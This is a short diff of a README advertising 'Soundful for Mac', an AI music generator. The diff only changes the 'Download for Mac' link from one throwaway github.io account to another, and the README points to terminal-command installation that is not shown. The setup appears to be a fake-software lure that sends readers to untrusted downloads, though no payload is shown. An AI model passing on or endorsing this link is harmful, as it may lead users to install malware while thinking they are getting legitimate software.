@@ -4,7 +4,7 @@
 Soundful for Mac is an **AI-powered music generator** that lets you create original, royalty-free tracks in seconds 🎵.  
 Follow the installation guide below to set up Soundful on your macOS device quickly and safely.  
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-%23007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/soundful)  
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-%23007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/soundful)  
 
 If the download button does not work, follow the manual installation instructions below using terminal commands.
 
